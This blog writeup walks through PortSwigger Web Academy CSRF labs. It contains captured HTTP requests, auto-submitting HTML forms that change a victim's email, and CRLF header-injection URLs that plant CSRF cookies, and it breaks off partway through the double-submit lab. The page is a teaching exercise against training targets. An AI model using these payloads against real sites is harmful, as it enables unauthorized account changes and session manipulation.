<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="(Portswigger/WebAcademy) - Cross-Site Request Forgery (CSRF)" /><meta name="author" content="eng4ge" /><meta property="og:locale" content="en" /><meta name="description" content="Intro This post/writeup is all about the Cross-Site Request Forgery." /><meta property="og:description" content="Intro This post/writeup is all about the Cross-Site Request Forgery." /><link rel="canonical" href="https://an9k0r.github.io/posts/CSRF/" /><meta property="og:url" content="https://an9k0r.github.io/posts/CSRF/" /><meta property="og:site_name" content="CyberSec-Research.Space" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-12-12T08:00:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="(Portswigger/WebAcademy) - Cross-Site Request Forgery (CSRF)" /><meta name="twitter:site" content="@cybersec_space" /><meta name="twitter:creator" content="@eng4ge" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"eng4ge"},"description":"Intro This post/writeup is all about the Cross-Site Request Forgery.","headline":"(Portswigger/WebAcademy) - Cross-Site Request Forgery (CSRF)","dateModified":"2022-12-12T08:00:00+01:00","url":"https://an9k0r.github.io/posts/CSRF/","datePublished":"2022-12-12T08:00:00+01:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://an9k0r.github.io/posts/CSRF/"},"@context":"https://schema.org"}</script><title>(Portswigger/WebAcademy) - Cross-Site Request Forgery (CSRF) | CyberSec-Research.Space</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="CyberSec-Research.Space"><meta name="application-name" content="CyberSec-Research.Space"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/logo.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">CyberSec-Research.Space</a></div><div class="site-subtitle font-italic">Information Security Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blogging/" class="nav-link"> <i class="fa-fw fas fa-book ml-xl-3 mr-xl-3 unloaded"></i> <span>BLOGS AND GUIDES</span> </a><li class="nav-item"> <a href="/hack_the_box/" class="nav-link"> <i class="fa-fw fas fa-bug ml-xl-3 mr-xl-3 unloaded"></i> <span>HACK THE BOX</span> </a><li class="nav-item"> <a href="/blue_team_ctf/" class="nav-link"> <i class="fa-fw fas fa-anchor ml-xl-3 mr-xl-3 unloaded"></i> <span>BLUE TEAM CTFS</span> </a><li class="nav-item"> <a href="/web_application/" class="nav-link"> <i class="fa-fw fas fa-terminal ml-xl-3 mr-xl-3 unloaded"></i> <span>WEB APPLICATION</span> </a><li class="nav-item"> <a href="/binary_exploitation/" class="nav-link"> <i class="fa-fw fas fa-microchip ml-xl-3 mr-xl-3 unloaded"></i> <span>BINARY EXPLOITATION</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/an9k0r" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/cybersec_space" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>(Portswigger/WebAcademy) - Cross-Site Request Forgery (CSRF)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>(Portswigger/WebAcademy) - Cross-Site Request Forgery (CSRF)</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/an9k0r">eng4ge</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-12-12 08:00:00 +0100" data-toggle="tooltip" data-placement="bottom" title="Mon, Dec 12, 2022, 8:00 AM +0100" >Dec 12, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1876 words"> <em>10 min</em> read</span></div></div></div><div class="post-content"><h1 id="intro">Intro</h1><p>This post/writeup is all about the Cross-Site Request Forgery.</p><p>I’ll be using primarily <a href="https://portswigger.net/web-security/csrf">Portswigger Web Academy</a> Labs, but i do intent do throw other labs and writeups here as well.</p><p>To learn more on the topic, please visit the article linked above at Portswigger’s.</p><h2 id="toc">TOC<a href="#toc" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><ul><li><a href="#intro">Intro</a><ul><li><a href="#toc">TOC</a></ul><li><a href="#csrf-vulnerability-with-no-defenses">CSRF vulnerability with no defenses</a><li><a href="#csrf-where-token-validation-depends-on-request-method">CSRF where token validation depends on request method</a><li><a href="#csrf-where-token-validation-depends-on-token-being-present">CSRF where token validation depends on token being present</a><li><a href="#csrf-where-token-is-not-tied-to-user-session">CSRF where token is not tied to user session</a><li><a href="#csrf-where-token-is-tied-to-non-session-cookie">CSRF where token is tied to non-session cookie</a><li><a href="#csrf-where-token-is-duplicated-in-cookie">CSRF where token is duplicated in cookie</a><li><a href="#csrf-where-referer-validation-depends-on-header-being-present">CSRF where Referer validation depends on header being present</a><li><a href="#csrf-with-broken-referer-validation">CSRF with broken Referer validation</a></ul><h1 id="csrf-vulnerability-with-no-defenses">CSRF vulnerability with no defenses</h1><blockquote><p>This lab’s email change functionality is vulnerable to CSRF.</p><p>To solve the lab, craft some HTML that uses a CSRF attack to change the viewer’s email address and upload it to your exploit server.</p><p>You can log in to your own account using the following credentials: wiener:peter</p></blockquote><p>This is how the lab’s web page looks like. It’s a blog but with logon option. <strong>Keep in mind that in this lab, delivering the payload to victim is done simply by clicking the button. We’re dealing with exploiting CSRF only!</strong></p><p><img data-src="/assets/images/fc641cb9eeec16b5fde983bbeda82cd551e3752ae794ce1d44c46c7c17cc88b8.png" alt="picture 1" data-proofer-ignore></p><p>Let’s login using provided credentials <code class="language-plaintext highlighter-rouge">wiener:peter</code>.</p><p><img data-src="/assets/images/4e5bb75e898d0b10b943111e9d06fb9583a8bce21f7423b3121370e2d6560f42.png" alt="picture 2" data-proofer-ignore></p><p>We can change the email and send check the request in <code class="language-plaintext highlighter-rouge">Burp</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>POST /my-account/change-email HTTP/1.1
Host: 0ab500a404d955f1c21131ce00500007.web-security-academy.net
Cookie: session=xFmhDnag2IDZr2PCyqFS0gyunrHVTtkp
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: https://0ab500a404d955f1c21131ce00500007.web-security-academy.net
Referer: https://0ab500a404d955f1c21131ce00500007.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

email=hey%40normal-user.net
</pre></table></code></div></div><p>As a login user we have a session token. <code class="language-plaintext highlighter-rouge">SameSite</code> attribute is not being used!</p><p>This is the template that i’ll use for this lab. It’s a simple form that changes the email to something else.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"anything@web-security-academy.net"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;script&gt;</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p><img data-src="/assets/images/d4ff9f92912b235b4c55071be1df1ad0672d68ba0620858e6b7c35da748d7d62.png" alt="picture 3" data-proofer-ignore></p><p>We now simply click on <code class="language-plaintext highlighter-rouge">Deliver exploit to victim</code> and in the background, the email of <code class="language-plaintext highlighter-rouge">wiener</code>’s should have been changed. We can check access log if the form has been visited by a victim.</p><p>It should be clear by now that having no CSRF defenses is not a good idea!</p><h1 id="csrf-where-token-validation-depends-on-request-method">CSRF where token validation depends on request method</h1><blockquote><p>This lab’s email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.</p><p>To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.</p><p>You can log in to your own account using the following credentials: wiener:peter</p></blockquote><p>Page looks indentical as seen above. We can login using <code class="language-plaintext highlighter-rouge">wiener:peter</code> and change an email. This is captured request (I’ve deleted few non-relevant headers):</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>POST /my-account/change-email HTTP/1.1
Host: 0ad9005c03111f09c097041f00bf0010.web-security-academy.net
Cookie: session=8gJDTnMZWjsviceaBy16qVHSXfaqLOZf
...
Origin: https://0ad9005c03111f09c097041f00bf0010.web-security-academy.net
Referer: https://0ad9005c03111f09c097041f00bf0010.web-security-academy.net/my-account
...
Connection: close

email=asd%40normal-user.net&amp;csrf=ZsSzUXhTgY9TZ3c6GZeavES14EQDiDAr
</pre></table></code></div></div><p>I’ll send request to <code class="language-plaintext highlighter-rouge">Responder</code> and try with same CSRF token and without. I can change the email again using same token.</p><p>If i remove the <code class="language-plaintext highlighter-rouge">csrf=</code> parameter and/or it’s value i’d see <code class="language-plaintext highlighter-rouge">"Missing parameter 'csrf'"</code>.</p><p>What if we send GET request instead?</p><p><img data-src="/assets/images/700efbad4bbb057e963700a3b834bcc398ff304b40b5247e1a4d1269221a2d04.png" alt="picture 4" data-proofer-ignore></p><p>Yep, that’ll work and CSRF token won’t get checked.</p><p>Following Payload can be applied which will cause GET request to be sent from the victim</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://0ae500a50484da0fc20b17a4007600fe.web-security-academy.net/my-account/change-email"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"anything@web-security-academy.net"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;script&gt;</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><h1 id="csrf-where-token-validation-depends-on-token-being-present">CSRF where token validation depends on token being present</h1><blockquote><p>This lab’s email change functionality is vulnerable to CSRF.</p><p>To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.</p><p>You can log in to your own account using the following credentials: <code class="language-plaintext highlighter-rouge">wiener:peter</code></p></blockquote><p>Only difference here compatered to previous labs is that when we remove csrf token entirely, we’ll be able to change the email.</p><p>CSRF token will not be checked if not present in the request.</p><p>In order to solve the lab, we have to login, change the email, capture that request and remove the CSRF parameter from the POST request.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>POST /my-account/change-email HTTP/1.1
Host: 0a4a002e04958d54c160c28800b500a0.web-security-academy.net
Cookie: session=Uj3Z174TrfQHhs4Ba9POcmOSyE8htiUX
...
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: https://0a4a002e04958d54c160c28800b500a0.web-security-academy.net
Referer: https://0a4a002e04958d54c160c28800b500a0.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
...
Te: trailers
Connection: close

email=asdd%40normal-user.net
</pre></table></code></div></div><p>This is what we’ll deliver to the victim using <code class="language-plaintext highlighter-rouge">Deliver exploit to victim</code> button on our exploit server.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"https://0a4a002e04958d54c160c28800b500a0.web-security-academy.net/my-account/change-email"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"anything@web-security-academy.net"</span><span class="nt">&gt;</span>
<span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;script&gt;</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><h1 id="csrf-where-token-is-not-tied-to-user-session">CSRF where token is not tied to user session</h1><blockquote><p>This lab’s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren’t integrated into the site’s session handling system.</p><p>To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.</p><p>You have two accounts on the application that you can use to help design your attack. The credentials are as follows:</p><ul><li><code class="language-plaintext highlighter-rouge">wiener:peter</code><li><code class="language-plaintext highlighter-rouge">carlos:montoya</code></ul></blockquote><p>In this lab we’ll login as wiener and carlos (two different browsers or using incognito mode) and we’ll try to swap the CSRF tokens and check if they’re bound to user or not. If not, we can just send our CSRF token to victim and email change should work.</p><p><img data-src="/assets/images/471be39da47f5f184aa638fcbf8c23644b88b12c845bd4f85cdf924e62cf17bb.png" alt="picture 5" data-proofer-ignore></p><p>Success. Only thing that we have to pay attention to is that CSRF token can be used only once!</p><p>Let’s deliver the payload to the victim.</p><p>We have to refresh the page and use the fresh, unused token, or change the email using <code class="language-plaintext highlighter-rouge">wiener</code> or <code class="language-plaintext highlighter-rouge">carlos</code> and intercept the request, grab the token and drop the request afterwards.</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"https://0a9300a403fc868dc0d03bd1009d007c.web-security-academy.net/my-account/change-email"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"anything@web-security-academy.net"</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"csrf"</span> <span class="na">value=</span><span class="s">"zQwm5Fz16qcy4aZ80oCSRagNpkNYVnCT"</span><span class="nt">&gt;</span>

<span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;script&gt;</span>
        <span class="nb">document</span><span class="p">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">submit</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</pre></table></code></div></div><p>Lab has been solved.</p><h1 id="csrf-where-token-is-tied-to-non-session-cookie">CSRF where token is tied to non-session cookie</h1><blockquote><p>This lab’s email change functionality is vulnerable to CSRF. It uses tokens to try to prevent CSRF attacks, but they aren’t fully integrated into the site’s session handling system.</p><p>To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.</p><p>You have two accounts on the application that you can use to help design your attack. The credentials are as follows:</p><ul><li>wiener:peter<li>carlos:montoya</ul></blockquote><p>This problem where token is tied to a non-session cookie might happen when the web app deploys two different frameworks which don’t interact efficently with each other - in regards of CSRF.</p><p>If we use <code class="language-plaintext highlighter-rouge">wiener</code> for testing and take <code class="language-plaintext highlighter-rouge">csrfKey</code> and <code class="language-plaintext highlighter-rouge">csrf</code> parameter from <code class="language-plaintext highlighter-rouge">carlos</code>, we’ll bypass CSRF protection succesfully.</p><p><img data-src="/assets/images/5fe591906d82c482bfd5f5b8eed48a08cbfc7eb61291d66c10aafa5651aff242.png" alt="picture 6" data-proofer-ignore></p><p>Now how we can deliver that?</p><p>This lab acts weird when we start search like this</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/?search=test%0d%0aSet-Cookie:%20csrfKey=wqVM7TKrfyTIhKMenMYcMc96RGP6DX6v%3b%20SameSite=None
</pre></table></code></div></div><p>Server responds with</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>HTTP/1.1 200 OK
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrfKey=wqVM7TKrfyTIhKMenMYcMc96RGP6DX6v; SameSite=None; Secure; HttpOnly
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 3215
</pre></table></code></div></div><p>We can send a <code class="language-plaintext highlighter-rouge">csrfKey</code>, or better said, reflect it to the victim.</p><p>I’ll use payload that was proposed in solution as well. We have to ditch the script and rather use <code class="language-plaintext highlighter-rouge">img</code> tag instead, to make reflection work!</p><div class="language-html highlighter-rouge"><div class="code-header"> <span label-text="HTML"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">"https://0a5300d20416d3fcc016e18b001800a7.web-security-academy.net/my-account/change-email"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"email"</span> <span class="na">value=</span><span class="s">"anything@web-security-academy.net"</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span> <span class="na">name=</span><span class="s">"csrf"</span> <span class="na">value=</span><span class="s">"N1emx758Z7WvJCyVpuDvJIDd1Gtl3D9Q"</span><span class="nt">&gt;</span>

<span class="nt">&lt;/form&gt;</span>
<span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"https://0a5300d20416d3fcc016e18b001800a7.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=y8QhVUO6h50Ing529s6rMEqhS1ySAAqn%3b%20SameSite=None"</span> <span class="na">onerror=</span><span class="s">"document.forms[0].submit()"</span><span class="nt">&gt;</span>
</pre></table></code></div></div><h1 id="csrf-where-token-is-duplicated-in-cookie">CSRF where token is duplicated in cookie</h1><blockquote><p>This lab’s email change functionality is vulnerable to CSRF. It attempts to use the insecure “double submit” CSRF prevention technique.</p><p>To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer’s email address.</p><p>You can log in to your own account using the following credentials: <code class="language-plaintext highlighter-rouge">wiener:peter</code></p></blockquote><p>In this lab we have the same values in the cookia an in the request</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>POST /my-account/change-email HTTP/1.1
Host: 0aef0089046807e7c06dccfb00dc00ae.web-security-academy.net
Cookie: csrf=H2kkj4Hk3A1z3sdIS5z3etffUqbplagI; session=8wqk16y4qG1WBQSFCiq0Oz0vOq259TJ1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0
...
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Origin: https://0aef0089046807e7c06dccfb00dc00ae.web-security-academy.net
Referer: https://0aef0089046807e7c06dccfb00dc00ae.web-security-academy.net/my-account
Upgrade-Insecure-Requests: 1
...
Te: trailers
Connection: close

email=asd%40normal-user.net&amp;csrf=H2kkj4Hk3A1z3sdIS5z3etffUqbplagI
</pre></table></code></div></div><p>If we send request to <code class="language-plaintext highlighter-rouge">search</code> endpoint which is known to set cookie for the <code class="language-plaintext highlighter-rouge">lastSearch</code>, but we can add <code class="language-plaintext highlighter-rouge">csrf</code> cookie as well!</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>/?search=test%0d%0aSet-Cookie:%20csrf=spoof 
</pre></table></code></div></div><p>and response:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>HTTP/1.1 200 OK
Set-Cookie: LastSearchTerm=test
Set-Cookie: csrf=spoof; Secure; HttpOnly
